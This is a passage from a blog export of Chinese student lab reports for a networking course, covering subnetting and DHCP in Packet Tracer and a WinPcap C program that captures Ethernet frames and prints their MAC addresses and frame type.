<td></td>
<td></td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116145608406.png"  alt="image-20201116145608406"></td>
</tr>
</tbody></table>
<p>根据实验结果观察可知</p>
<table>
<thead>
<tr>
<th>可以ping通</th>
<th>不可以ping通</th>
</tr>
</thead>
<tbody><tr>
<td>子网号相同</td>
<td>子网号不同且之间没有$2^n$倍数关系</td>
</tr>
<tr>
<td>子网号和掩码不同<br>但子网号之间之间有$2^n$倍数关系（见PC2）</td>
<td></td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="实验二-DHCP的配置"><a href="#实验二-DHCP的配置" class="headerlink" title="实验二 DHCP的配置"></a>实验二 DHCP的配置</h2><h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116151000268.png"  alt="image-20201116151000268" style="zoom: 67%;">

<h3 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h3><ol>
<li><p>服务器</p>
<ol>
<li>配置服务器IP<ol>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116151117163.png"  alt="image-20201116151117163" style="zoom: 50%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116151144842.png"  alt="image-20201116151144842" style="zoom:50%;"></li>
</ol>
</li>
<li>配置DHCP<ol>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116151233101.png"  alt="image-20201116151233101" style="zoom:50%;">
</li>
</ol>
</li>
</ol>
</li>
<li><p><strong>中断自动获取IP地址</strong></p>
<ol>
<li><p>调整IP获取方式为DHCP<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116151349132.png"  alt="image-20201116151349132" style="zoom: 67%;"></p>
</li>
<li><p>获取IP地址</p>
<ol>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116151441173.png"  alt="image-20201116151441173"></p>
</li>
<li><p>另一个终端为</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116151514147.png"  alt="image-20201116151514147"></p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>packettracer</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>网络技术与应用作业二 WPcap的安装与基本使用</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="网络技术与应用第二次实验报告"><a href="#网络技术与应用第二次实验报告" class="headerlink" title="网络技术与应用第二次实验报告"></a>网络技术与应用第二次实验报告</h1><p>[TOC]</p>
<h2 id="实验内容说明"><a href="#实验内容说明" class="headerlink" title="实验内容说明"></a>实验内容说明</h2><p><strong>作业题目：</strong>综合性实验（1） 利用WinPcap编程捕获数据包</p>
<p><strong>作业说明：</strong></p>
<p>（1）了解WinPcap（或LibPcap、NPcap）的架构。<br>（2）学习WinPcap（或LibPcap、NPcap）的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。（3）学习多线程（或多进程）程序编写方法。<br>（4）通过WinPcap（或LibPcap、NPcap）编程，实现本机的数据包的捕获，显示以太帧的源地址、目的地址和帧类型/长度。<br>（5）捕获的数据报不要求硬盘存储，但应以简单明了的方式在屏幕上显示。必显字段包括源MAC地址、目的MAC地址、帧类型/长度。<br>（6）编写的程序应结构清晰，具有较好的可读性。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><h3 id="（1）WinPcap架构。"><a href="#（1）WinPcap架构。" class="headerlink" title="（1）WinPcap架构。"></a>（1）WinPcap架构。</h3><p>WinPcap是一个<strong>win32</strong>平台下的数据报捕获体系架构，它的主要功能是进行数据报捕获和网络分析。它包含了</p>
<ul>
<li><p><strong>内核级别的包过滤</strong>：在操作系统内核中运行Netgroup Packet Fileter(NPF)<strong>设备驱动程序</strong>来<strong>与网络接口驱动直接交互</strong>。NPF提供了数据包捕获与发送的基本特性，同时也提供了一个<strong>可编程的过滤系统</strong>。可以用于<strong>限制一个会话，只捕获特定的网络数据包</strong>。</p>
</li>
<li><p><strong>低层次的动态链接库（packet.dll）</strong>：提供<strong>底层API</strong>，可以用来直接访问驱动程序的函数，提供一个独立于微软的不同操作系统的编程接口。</p>
</li>
<li><p><strong>高级别系统无关的函数库（wpcap.dll）</strong>：提供与其它系统下的pcap程序（如libpcap）的兼容性。</p>
</li>
</ul>
<p>本次实验将<strong>利用WinPcap高级别系统无关函数库中提供的函数对流经网卡的数据包进行捕获</strong>。</p>
<p>一般利用WinPcap捕获数据报需要经过3个步骤</p>
<ol>
<li><strong>获取设备列表</strong></li>
<li><strong>打开网络接口</strong></li>
<li><strong>在打开的网络接口卡上捕获网络数据包</strong></li>
</ol>
<h3 id="（2）WinPcap的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。"><a href="#（2）WinPcap的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。" class="headerlink" title="（2）WinPcap的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。"></a>（2）WinPcap的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。</h3><h3 id="获取设备列表"><a href="#获取设备列表" class="headerlink" title="==获取设备列表=="></a>==获取设备列表==</h3><p><strong>函数原型与参数解析：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pcap_findalldevs_ex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="comment">//指定从哪里获得接口列表，该函数可以获取本机、远程设备和文件的网络接口列表</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//如果希望得到本机的网络接口列表，可以使用PCAP_SRC_IF_STRING常数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>* source;</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//在获取远程设备的网络接口列表时，如果远程设备需要认证，则需要使用该参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//该参数对获取本机的网络接口列表没有任何意义，给NULL即可</span></span></span></span><br><span class="line"><span class="function"><span class="params">    struct pcap_rmtauth auth,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//函数成功返回后，该参数指向获取的网络接口列表的第一个元素，列表中的所有元素都是一个pcap_if_t结构</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">pcap_if_t</span> **alldevs,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//用户定义的存放错误信息的缓冲区，缓冲区长度不饿能小于PCAP_ERRBUF_SIZE</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>* errbuf;</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure>

<p><strong>返回值：</strong></p>
<p>调用发生错误时，返回-1，具体错误信息输出到errbuf中<br>调用成功时返回0</p>
<h3 id="pcap-if-t结构"><a href="#pcap-if-t结构" class="headerlink" title="pcap_if_t结构"></a>pcap_if_t结构</h3><p><strong>结构定义：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Typedef <span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> <span class="title">pcap_if_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Item in a list of interfaces.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个网卡</span></span><br><span class="line">	<span class="keyword">char</span> *name;		<span class="comment">/* name to hand to "pcap_open_live()" */</span><span class="comment">//网卡名</span></span><br><span class="line">	<span class="keyword">char</span> *description;	<span class="comment">/* textual description of interface, or NULL */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> *<span class="title">addresses</span>;</span><span class="comment">//IP地址，一块网卡上可能有很多个IP地址，使用链表格式存储</span></span><br><span class="line">	bpf_u_int32 flags;	<span class="comment">/* PCAP_IF_ interface flags */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第二次实验/image-20201104173021027.png"  alt="image-20201104173021027" style="zoom: 43%;">

<h3 id="释放设备列表"><a href="#释放设备列表" class="headerlink" title="释放设备列表"></a>释放设备列表</h3><p><strong>函数原型:</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pcap_freealldevs</span><span class="params">(<span class="keyword">pcap_if_t</span>* alldevs)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="打开网络接口"><a href="#打开网络接口" class="headerlink" title="==打开网络接口=="></a>==打开网络接口==</h3><p>在对某一个网络接口卡进行监听之前，首先需要将其打开</p>
<p><strong>函数原型与参数解析：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pcap_t</span> *<span class="title">pcap_open</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span> *source, <span class="comment">//指向需要打开的网络接口卡的名字</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> snaplen, <span class="comment">//获取数据报的最大长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> flags, <span class="comment">//指定以核中方式打开网络接口设备并获取数据包，最常用的时PCAP_OPENFLA_PROMISCUOUS,它通知系统以混杂模式打开网络接口设备</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> read_timeout, <span class="comment">//数据包捕获函数等待一个数据包的最大时间，如果该段时间内没有捕获到数据包，将以0值返回</span></span></span></span><br><span class="line"><span class="function"><span class="params">    struct pcap_rmtauth *auth,<span class="comment">//捕获本机时设为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span> *errbuf<span class="comment">//用户自定义的存放错误信息的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>返回值：</strong></p>
<p>调用出错时返回NULL<br>成功时返回一个指向pcap_t的指针</p>
<h3 id="在打开的网络接口卡上捕获网络数据包"><a href="#在打开的网络接口卡上捕获网络数据包" class="headerlink" title="==在打开的网络接口卡上捕获网络数据包=="></a>==在打开的网络接口卡上捕获网络数据包==</h3><p><strong>函数原型与参数解析：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pcap_next_ex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">pcap_t</span> * p, </span></span></span><br><span class="line"><span class="function"><span class="params">    struct pcap_pkthdr ** pkt_header,<span class="comment">//数据包头部基本信息，捕获时间、长度等</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> u_char ** pkt_data<span class="comment">//数据包具体内容</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>返回值</strong></p>
<p>正确捕获到数据包，返回1，pkt_header保存数据包基本信息，pkt_data指向捕获数据包的完整数据<br>没有捕获到信息，返回0，超过参数read_timeout限制，此时pkt_header和pkt_data均不可用<br>调用过程中发生错误，返回-1</p>
<h3 id="（3）多线程（或多进程）编程"><a href="#（3）多线程（或多进程）编程" class="headerlink" title="（3）多线程（或多进程）编程"></a>（3）多线程（或多进程）编程</h3><p><strong>函数原型与参数解析：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE</span><br><span class="line">WINAPI</span><br><span class="line">CreateThread(</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//NULL</span></span><br><span class="line">    _In_ SIZE_T dwStackSize,<span class="comment">//NULL</span></span><br><span class="line">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//线程函数名</span></span><br><span class="line">    _In_opt_ __drv_aliasesMem LPVOID lpParameter,<span class="comment">//函数参数</span></span><br><span class="line">    _In_ DWORD dwCreationFlags,<span class="comment">//0</span></span><br><span class="line">    _Out_opt_ LPDWORD lpThreadId<span class="comment">//线程标号</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p><strong>样例：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="comment">//多线程</span></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">pcap_if_t</span>* d = alldevs; d != <span class="literal">NULL</span>; d = d-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">			hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest, LPVOID(d-&gt;name), <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line">        <span class="comment">//执行完一个线程函数后等待500ms</span></span><br><span class="line">			WaitForSingleObject(hThread, <span class="number">500</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* name = (<span class="keyword">char</span>*)lparam;<span class="comment">//接受参数</span></span><br><span class="line">	get_info(name);<span class="comment">//执行过程</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>目的：通过WinPcap（或LibPcap、NPcap）编程，实现本机的数据包的捕获，显示以太帧的源地址、目的地址和帧类型/长度。</strong></p>
<ul>
<li><p>环境的配置与头文件和库</p>
<ul>
<li><p>在官网<a href="http://www.winpcap.org下载WinPca软件和相应驱动程序```developer&#39;s" target="_blank" rel="noopener">http://www.winpcap.org下载WinPca软件和相应驱动程序```developer&#39;s</a> pack```，执行exe文件并解压压缩包</p>
</li>
<li><p>在目录<strong>WpdPack\Include\pcap</strong>目录下的<strong>pcap.h</strong>中添加一行<code>#define WIN32</code></p>
<ul>
<li>创建项目，资源管理器的<code>资源文件</code>-&gt;<code>添加</code>-&gt;<code>导入现有项</code>，添加WpdPack目录下的两个lib文件：Packet.lib和wpcap.lib</li>
</ul>
</li>
<li><p>在<code>项目</code>-&gt;<code>属性</code>-&gt;<code>C/C++</code>中将<code>winpcap\WpdPack\Include</code>添加到<code>附加包含目录</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201104160420496.png"  alt="image-20201104160420496"></p>
</li>
<li><p>将<strong>WPCAP</strong>和<strong>HAVE_REMOTE</strong>两个标号添加到预处理器定义中</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201104161550939.png"  alt="image-20201104161550939"></p>
<ul>
<li><p>在程序中引入相应的包和库。注意，<code>#include &quot;pcap.h&quot;</code>后不需要再引入<code>iostream</code>、<code>stdio.h</code>等头文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">include <span class="string">"pcap.h"</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)<span class="comment">//链接ws2_32.lib库文件到此项目中</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>数据结构的定义，数据分为<strong>帧首部</strong>和<strong>IP首部</strong>，其中帧首部的<strong>目的地址</strong>、<strong>源地址</strong>和<strong>帧长度/类型</strong>是我们本次实验需要捕获并显示的内容。</p>
<p>并且，C语言变量以<strong>4bytes对齐</strong>，不足4bytes的变量编译器自动填充，所以，为了方便<strong>数据类型的转换</strong>，设置为<strong>以1字节对齐</strong>。例如，对于类型<code>FrameHeader_t</code>，如果以1bytes对齐，一个该类型变量将占用6+6+2=<strong>14bytes</strong>，若以4bytes对齐，将补齐为<strong>16字节</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//以1byte方式对齐</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FrameHeader_t</span> &#123;</span><span class="comment">//帧首部</span></span><br><span class="line">	BYTE DesMAC[<span class="number">6</span>];<span class="comment">//目的地址</span></span><br><span class="line">	BYTE SrcMAC[<span class="number">6</span>];<span class="comment">//源地址</span></span><br><span class="line">	WORD FrameType;<span class="comment">//帧类型</span></span><br><span class="line">&#125;frameHeader_t;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IPHeader_t</span> &#123;</span><span class="comment">//IP首部</span></span><br><span class="line">	BYTE Ver_HLen;</span><br><span class="line">	BYTE TOS;</span><br><span class="line">	WORD TotalLen;</span><br><span class="line">	WORD ID;</span><br><span class="line">	WORD Flag_Segment;</span><br><span class="line">	BYTE TTL;</span><br><span class="line">	BYTE Protocol;</span><br><span class="line">	WORD Checksum;</span><br><span class="line">	ULONG SrcIP;</span><br><span class="line">	ULONG DstIP;</span><br><span class="line">&#125;IPHeader_t;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Data_t</span> &#123;</span><span class="comment">//包含帧首部和IP首部的数据包</span></span><br><span class="line">	FrameHeader_t FrameHeader;</span><br><span class="line">	IPHeader_t IPHeader;</span><br><span class="line">&#125;Data_t;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()<span class="comment">//恢复4bytes对齐</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取本机设备列表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PCAP_SRC_IF_STRING为const char* 型，需要转换为char*类型</span></span><br><span class="line"><span class="keyword">char</span> *pcap_src_if_string = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(PCAP_SRC_IF_STRING)];</span><br><span class="line"><span class="built_in">strcpy</span>(pcap_src_if_string, PCAP_SRC_IF_STRING);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_alldevs</span><span class="params">()</span>	<span class="comment">//获取本机的设备列表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//该函数第一个参数类型为char*类型</span></span><br><span class="line">    <span class="comment">//使用pcap_findalldevs_ex函数，将设备列表存储到alldevs中</span></span><br><span class="line">	<span class="keyword">if</span> (pcap_findalldevs_ex(pcap_src_if_string, <span class="literal">NULL</span>, &amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//如果出现错误，则打印错误信息</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>用<code>pcap_open</code>函数<strong>打开特定网络接口卡</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定网卡名称</span></span><br><span class="line"><span class="keyword">pcap_t</span>* p = pcap_open(name, <span class="number">65536</span>, PCAP_OPENFLAG_PROMISCUOUS, <span class="number">100</span>, <span class="literal">NULL</span>, errbuf);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用函数<code>pcap_next_ex</code><strong>捕捉网卡信息</strong>，并将数据内容信息存储再<strong>pkt_data</strong>中，如果成功捕获，则返回1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pcap_pkthdr* pkt_header;</span><br><span class="line"><span class="keyword">const</span> u_char* pkt_data;</span><br><span class="line"><span class="keyword">int</span> rtn = pcap_next_ex(p, &amp;pkt_header, &amp;pkt_data);</span><br></pre></td></tr></table></figure>
</li>
<li><p>为了便于信息提取，需要将捕获到的<strong>char*</strong>类型数据<code>pkt_data</code>转换为<code>Data_t</code>类型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//printf("%s\t%s\n", d-&gt;name, d-&gt;description);</span></span><br><span class="line">Data_t* IPPacket;</span><br><span class="line"><span class="comment">//WORD RecvChecksum;</span></span><br><span class="line">IPPacket = (Data_t*)pkt_data;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于源MAC地址和目的MAC地址的打印，由于FrameHeader.DesMAC和SrcMAC为<strong>byte</strong>类型数组，需要将其元素以<strong>16进制数</strong>的形式打印</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输出目的MAC地址</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"目的MAC地址："</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x"</span>, IPPacket-&gt;FrameHeader.DesMAC[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>( <span class="string">" 源MAC地址:"</span>);</span><br><span class="line"><span class="comment">//输出源MAC地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x"</span>, IPPacket-&gt;FrameHeader.SrcMAC[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于网络序和主机b序采用的<strong>大小端约定不同</strong>，所以对于<strong>WORD</strong>类型的帧类型/长度，需要使用<strong>ntohs函数</strong>转换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>( <span class="string">" 帧类型/长度："</span>);</span><br><span class="line"><span class="comment">//ntohs((u_short)IPPacket-&gt;FrameHeader.FrameType);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, ntohs(IPPacket-&gt;FrameHeader.FrameType));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"H\n"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>为了<strong>同时监听所有网卡</strong>，需要使用<strong>多线程编程</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//线程函数定义</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* name = (<span class="keyword">char</span>*)lparam;</span><br><span class="line">	get_info(name);<span class="comment">//监听网卡，捕获信息相关函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//线程函数调用</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;<span class="keyword">for</span> (<span class="keyword">pcap_if_t</span>* d = alldevs; d != <span class="literal">NULL</span>; d = d-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">			hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest, LPVOID(d-&gt;namec), <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line">        <span class="comment">//延迟，减少无用的线程以减小CPU负担</span></span><br><span class="line">			WaitForSingleObject(hThread, <span class="number">500</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>关闭网卡</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pcap_freealldevs(alldevs);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201104130630244.png"  alt="image-20201104130630244"></p>
<p>其中</p>
<ul>
<li><strong>类型/长度=0800H</strong>，指定是<strong>IP类型数据报</strong></li>
<li><strong>目的MAC地址=ff:ff:ff:ff:ff:ff</strong>，是指<strong>广播发送</strong></li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wpcap</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>网络技术与应用作业一 PacketTracer的基本使用</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>网络技术与应用 第一次实验报告</p>
<h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h4 id="第1节-实验内容说明"><a href="#第1节-实验内容说明" class="headerlink" title="第1节 实验内容说明"></a>第1节 实验内容说明</h4><p>学习虚拟仿真软件的基本使用方法。</p>
<h4 id="第2节-实验准备"><a href="#第2节-实验准备" class="headerlink" title="第2节 实验准备"></a>第2节 实验准备</h4><p>在CISCO网站报名packet tracer课程，注册学生账号，下载packet tracer，安装</p>
<h4 id="第3节-实验步骤"><a href="#第3节-实验步骤" class="headerlink" title="第3节 实验步骤"></a>第3节 实验步骤</h4><p>可以在拓扑图中添加部件</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014152918649.png"  alt="image-20201014152918649" style="zoom: 50%;">

<p>添加连接</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014153029358.png"  alt="image-20201014153029358" style="zoom: 50%;">

<p>运行仿真实验</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014153048326.png"  alt="image-20201014153048326" style="zoom:80%;">





<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><h4 id="第1节-实验内容说明-1"><a href="#第1节-实验内容说明-1" class="headerlink" title="第1节 实验内容说明"></a>第1节 实验内容说明</h4><p>在仿真环境下进行==单集线器共享式==以太网组网，测试网络的连通性。</p>
<h4 id="第2节-实验准备-1"><a href="#第2节-实验准备-1" class="headerlink" title="第2节 实验准备"></a>第2节 实验准备</h4><p>说明：本节要包含自己要搭建的拓扑图以及拓扑图中各设备的IP与端口分配情况， 或者包含其他的实验前准备事项，如果没有可以省略本节。</p>
<h4 id="第3节-实验步骤-1"><a href="#第3节-实验步骤-1" class="headerlink" title="第3节 实验步骤"></a>第3节 实验步骤</h4><ul>
<li><p>添加组件</p>
<ul>
<li><p>添加集线器（Hub）和终端（end devices）</p>
